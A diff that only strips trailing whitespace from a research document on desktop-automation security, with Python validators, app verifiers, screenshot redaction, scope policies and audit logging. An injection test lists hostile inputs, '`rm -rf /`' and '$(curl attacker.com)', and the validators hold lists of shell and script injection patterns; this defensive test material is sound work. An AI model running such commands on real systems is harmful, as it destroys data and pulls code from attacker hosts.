@@ -2,8 +2,8 @@
 
 **Purpose:** Comprehensive security analysis, threat modeling, and security controls for cross-platform desktop automation.
 
-**Date:** 2026-02-16  
-**Status:** Research  
+**Date:** 2026-02-16
+**Status:** Research
 **Related:** CROSS_PLATFORM_MULTI_TENANT_DESKTOP_AUTOMATION_RESEARCH.md
 
 ---
@@ -90,7 +90,7 @@ Mitigation: Least privilege, permission auditing
 ```python
 class SelectorValidator:
     """Validate element selectors for security."""
-    
+
     DANGEROUS_PATTERNS = [
         r"javascript:",  # Script injection
         r"on\w+\s*=",  # Event handlers (onclick, onerror, etc.)
@@ -100,22 +100,22 @@ class SelectorValidator:
         r"`",  # Shell injection
         r"\$\(?",  # Command substitution
     ]
-    
+
     def validate(self, selector: str) -> tuple[bool, str]:
         """Validate selector, return (is_valid, reason)."""
         # Check length (prevent DoS)
         if len(selector) > 1000:
             return False, "Selector too long (max 1000 chars)"
-        
+
         # Check for dangerous patterns
         for pattern in self.DANGEROUS_PATTERNS:
             if re.search(pattern, selector, re.IGNORECASE):
                 return False, f"Dangerous pattern detected: {pattern}"
-        
+
         # Check for control characters
         if any(ord(c) < 32 and c not in '\t\n\r' for c in selector):
             return False, "Control characters not allowed"
-        
+
         return True, "OK"
 ```
 
@@ -123,24 +123,24 @@ class SelectorValidator:
 ```python
 class TextInputValidator:
     """Validate text input for security."""
-    
+
     def validate(self, text: str, context: str = "general") -> tuple[bool, str]:
         """Validate text input."""
         # Shell command injection prevention
         dangerous_chars = [";", "|", "&", "`", "$", "(", ")", "<", ">"]
         if any(char in text for char in dangerous_chars):
             return False, "Dangerous characters detected"
-        
+
         # Script injection prevention
         if any(tag in text.lower() for tag in ["<script", "javascript:", "onerror"]):
             return False, "Script injection attempt detected"
-        
+
         # Context-specific validation
         if context == "terminal":
             # Stricter validation for terminal input
             if re.search(r"[;&|`$]", text):
                 return False, "Terminal command injection attempt"
-        
+
         return True, "OK"
 ```
 
@@ -150,7 +150,7 @@ class TextInputValidator:
 ```python
 class macOSAppVerifier:
     """Verify macOS app identity."""
-    
+
     def verify_app(self, app_name: str, bundle_id: str | None = None) -> bool:
         """Verify app is legitimate."""
         # Check app signature
@@ -162,11 +162,11 @@ class macOSAppVerifier:
             )
             if result.returncode != 0:
                 return False
-        
+
         # Check against allowlist
         allowed_apps = self._get_allowed_apps()
         return app_name in allowed_apps or bundle_id in allowed_apps
-    
+
     def _get_allowed_apps(self) -> set[str]:
         """Get list of allowed apps from config."""
         # Read from config file
@@ -178,7 +178,7 @@ class macOSAppVerifier:
 ```python
 class WindowsAppVerifier:
     """Verify Windows app identity."""
-    
+
     def verify_app(self, exe_path: str, window_title: str) -> bool:
         """Verify app is legitimate."""
         # Check executable signature
@@ -189,7 +189,7 @@ class WindowsAppVerifier:
         )
         if "NotSigned" in result.stdout:
             return False
-        
+
         # Check window title matches expected pattern
         expected_patterns = self._get_allowed_patterns(exe_path)
         return any(re.match(p, window_title) for p in expected_patterns)
@@ -201,27 +201,27 @@ class WindowsAppVerifier:
 ```python
 class ScreenshotRedactor:
     """Redact sensitive data from screenshots."""
-    
+
     SENSITIVE_REGIONS = [
         {"type": "password_field", "pattern": r"password|passwd|pwd"},
         {"type": "credit_card", "pattern": r"\d{4}[-\s]?\d{4}[-\s]?\d{4}[-\s]?\d{4}"},
         {"type": "ssn", "pattern": r"\d{3}-\d{2}-\d{4}"},
         {"type": "email", "pattern": r"[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}"},
     ]
-    
+
     def redact(self, screenshot: bytes) -> bytes:
         """Redact sensitive regions from screenshot."""
         img = Image.open(io.BytesIO(screenshot))
-        
+
         # Detect sensitive regions using OCR or heuristics
         sensitive_regions = self._detect_sensitive_regions(img)
-        
+
         # Redact regions
         for region in sensitive_regions:
             x, y, w, h = region["x"], region["y"], region["w"], region["h"]
             # Black out region
             img.paste((0, 0, 0), (x, y, x+w, y+h))
-        
+
         # Convert back to bytes
         output = io.BytesIO()
         img.save(output, format="PNG")
@@ -232,18 +232,18 @@ class ScreenshotRedactor:
 ```python
 class ScreenshotEncryption:
     """Encrypt screenshots at rest."""
-    
+
     def encrypt(self, screenshot: bytes, key: bytes) -> bytes:
         """Encrypt screenshot."""
         from cryptography.fernet import Fernet
-        
+
         fernet = Fernet(key)
         return fernet.encrypt(screenshot)
-    
+
     def decrypt(self, encrypted: bytes, key: bytes) -> bytes:
         """Decrypt screenshot."""
         from cryptography.fernet import Fernet
-        
+
         fernet = Fernet(key)
         return fernet.decrypt(encrypted)
 ```
@@ -254,32 +254,32 @@ class ScreenshotEncryption:
 ```python
 class AutomationScope:
     """Define automation scope restrictions."""
-    
+
     def __init__(self, policy: dict):
         self.allowed_apps = set(policy.get("allowed_apps", []))
         self.blocked_apps = set(policy.get("blocked_apps", []))
         self.allowed_windows = set(policy.get("allowed_windows", []))
         self.blocked_regions = policy.get("blocked_regions", [])
-    
+
     def is_allowed(self, app_name: str, window_title: str, region: dict) -> bool:
         """Check if automation is allowed."""
         # Check app allowlist
         if self.allowed_apps and app_name not in self.allowed_apps:
             return False
-        
+
         # Check app blocklist
         if app_name in self.blocked_apps:
             return False
-        
+
         # Check window allowlist
         if self.allowed_windows and window_title not in self.allowed_windows:
             return False
-        
+
         # Check region restrictions
         for blocked in self.blocked_regions:
             if self._region_overlaps(region, blocked):
                 return False
-        
+
         return True
 ```
 
@@ -287,23 +287,23 @@ class AutomationScope:
 ```python
 class ActionTypePolicy:
     """Policy for action type restrictions."""
-    
+
     def __init__(self, policy: dict):
         self.allowed_actions = set(policy.get("allowed_actions", ["click", "type_text", "find_element"]))
         self.blocked_actions = set(policy.get("blocked_actions", []))
         self.requires_approval = set(policy.get("requires_approval", ["screenshot", "clipboard"]))
-    
+
     def is_allowed(self, action_type: str) -> tuple[bool, str]:
         """Check if action is allowed."""
         if action_type in self.blocked_actions:
             return False, f"Action {action_type} is blocked"
-        
+
         if self.allowed_actions and action_type not in self.allowed_actions:
             return False, f"Action {action_type} not in allowlist"
-        
+
         if action_type in self.requires_approval:
             return False, f"Action {action_type} requires approval"
-        
+
         return True, "OK"
 ```
 
@@ -337,11 +337,11 @@ class AutomationAuditEntry:
 ```python
 class AutomationAuditLogger:
     """Comprehensive audit logging."""
-    
+
     def __init__(self, audit_path: Path):
         self.audit_path = audit_path
         self.audit_path.mkdir(parents=True, exist_ok=True)
-    
+
     def log_action(
         self,
         agent_id: str,
@@ -365,12 +365,12 @@ class AutomationAuditLogger:
             security_flags=context.get("security_flags", []),
             cost_usd=context.get("cost_usd", 0.0),
         )
-        
+
         # Write to audit log (JSONL format)
         audit_file = self.audit_path / f"automation_audit_{datetime.now(UTC).date()}.jsonl"
         with audit_file.open("a") as f:
             f.write(json.dumps(entry.to_dict()) + "\n")
-        
+
         # Encrypt sensitive screenshots
         if context.get("screenshot_before"):
             self._encrypt_screenshot(context["screenshot_before"], entry.timestamp)
@@ -382,14 +382,14 @@ class AutomationAuditLogger:
 ```python
 class SecurityAnomalyDetector:
     """Detect security anomalies in automation."""
-    
+
     def detect_anomalies(self, audit_log: Path) -> list[dict]:
         """Detect security anomalies."""
         anomalies = []
-        
+
         # Load recent audit entries
         entries = self._load_recent_entries(audit_log, hours=24)
-        
+
         # Check for suspicious patterns
         # 1. High failure rate
         failure_rate = sum(1 for e in entries if not e.result.success) / len(entries)
@@ -399,7 +399,7 @@ class SecurityAnomalyDetector:
                 "rate": failure_rate,
                 "severity": "medium"
             })
-        
+
         # 2. Unusual app access
         app_counts = Counter(e.app_name for e in entries)
         unusual_apps = [app for app, count in app_counts.items() if count > 100]
@@ -409,7 +409,7 @@ class SecurityAnomalyDetector:
                 "apps": unusual_apps,
                 "severity": "high"
             })
-        
+
         # 3. Screenshot frequency spike
         screenshot_count = sum(1 for e in entries if e.action.type == "screenshot")
         if screenshot_count > 1000:
@@ -418,7 +418,7 @@ class SecurityAnomalyDetector:
                 "count": screenshot_count,
                 "severity": "medium"
             })
-        
+
         return anomalies
 ```
 
@@ -441,7 +441,7 @@ class SecurityAnomalyDetector:
 ```python
 class macOSPermissionChecker:
     """Check macOS permissions."""
-    
+
     def check_accessibility(self) -> bool:
         """Check if Accessibility permission is granted."""
         try:
@@ -450,7 +450,7 @@ class macOSPermissionChecker:
             return True
         except Exception:
             return False
-    
+
     def check_screen_recording(self) -> bool:
         """Check if Screen Recording permission is granted."""
         # Try to capture screen
@@ -465,17 +465,17 @@ class macOSPermissionChecker:
             return True
         except Exception:
             return False
-    
+
     def request_permissions(self):
         """Request missing permissions."""
         missing = []
-        
+
         if not self.check_accessibility():
             missing.append("Accessibility")
-        
+
         if not self.check_screen_recording():
             missing.append("Screen Recording")
-        
+
         if missing:
             # Open System Preferences
             for perm in missing:
@@ -495,7 +495,7 @@ class macOSPermissionChecker:
 ```python
 class WindowsPermissionChecker:
     """Check Windows permissions."""
-    
+
     def check_uia_access(self) -> bool:
         """Check if UIA Access is enabled."""
         try:
@@ -504,16 +504,16 @@ class WindowsPermissionChecker:
             return True
         except Exception:
             return False
-    
+
     def request_uia_access(self):
         """Request UIA Access (requires admin)."""
         # Check if running as admin
         import ctypes
         is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
-        
+
         if not is_admin:
             raise PermissionError("UIA Access requires administrator privileges")
-        
+
         # Enable UIA Access via registry
         import winreg
         key = winreg.OpenKey(
@@ -532,21 +532,21 @@ class WindowsPermissionChecker:
 ```python
 class PermissionAuditor:
     """Audit permission usage."""
-    
+
     def audit_permissions(self, audit_log: Path) -> dict:
         """Generate permission audit report."""
         entries = self._load_entries(audit_log)
-        
+
         # Count permission checks
         permission_checks = {}
         for entry in entries:
             for check in entry.permission_checks:
                 perm_type = check["type"]
                 permission_checks[perm_type] = permission_checks.get(perm_type, 0) + 1
-        
+
         # Find permission denials
         denials = [e for e in entries if "permission_denied" in e.security_flags]
-        
+
         return {
             "total_checks": sum(permission_checks.values()),
             "permission_breakdown": permission_checks,
@@ -580,21 +580,21 @@ class PermissionAuditor:
 ```python
 class LeastPrivilegeAutomation:
     """Automation with least privilege."""
-    
+
     def __init__(self, agent_id: str, capabilities: set[str]):
         self.agent_id = agent_id
         self.capabilities = capabilities
-    
+
     def execute(self, action: AutomationAction) -> AutomationResult:
         """Execute only if action requires allowed capabilities."""
         required = self._get_required_capabilities(action)
-        
+
         if not required.issubset(self.capabilities):
             return AutomationResult(
                 success=False,
                 error=f"Insufficient privileges: {required - self.capabilities}"
             )
-        
+
         return self._execute_action(action)
 ```
 
@@ -608,16 +608,16 @@ desktop_automation:
     allowed_apps: []  # Empty = deny all
     allowed_actions: ["click", "type_text", "find_element"]  # Minimal set
     blocked_actions: ["screenshot", "clipboard"]  # Sensitive actions blocked
-    
+
     # Default: Require approval for sensitive actions
     requires_approval: ["screenshot", "clipboard", "file_operations"]
-    
+
     # Default: Encrypt screenshots
     encrypt_screenshots: true
-    
+
     # Default: Redact sensitive data
     redact_screenshots: true
-    
+
     # Default: Audit all actions
     audit_all_actions: true
 ```
@@ -645,7 +645,7 @@ def test_input_injection():
         "`rm -rf /`",
         "$(curl attacker.com)",
     ]
-    
+
     validator = SelectorValidator()
     for malicious in malicious_inputs:
         is_valid, reason = validator.validate(malicious)
@@ -721,22 +721,22 @@ def test_input_injection():
 ```python
 class GDPRCompliantAutomation:
     """GDPR-compliant automation."""
-    
+
     def __init__(self):
         self.consent_required = True
         self.encryption_enabled = True
         self.data_retention_days = 30
-    
+
     def requires_consent(self) -> bool:
         """Check if user consent is required."""
         return self.consent_required
-    
+
     def encrypt_screenshot(self, screenshot: bytes) -> bytes:
         """Encrypt screenshot for GDPR compliance."""
         # Use user-specific encryption key
         key = self._get_user_encryption_key()
         return self._encrypt(screenshot, key)
-    
+
     def delete_user_data(self, user_id: str):
         """Delete all automation data for user (GDPR right to deletion)."""
         # Delete audit logs
@@ -802,7 +802,7 @@ class GDPRCompliantAutomation:
 
 ## 8. EXTENSION_SUMMARY
 
-**Extended on:** 2026-02-17  
+**Extended on:** 2026-02-17
 **Extended by:** Claude Code
 
 ### Changes Made
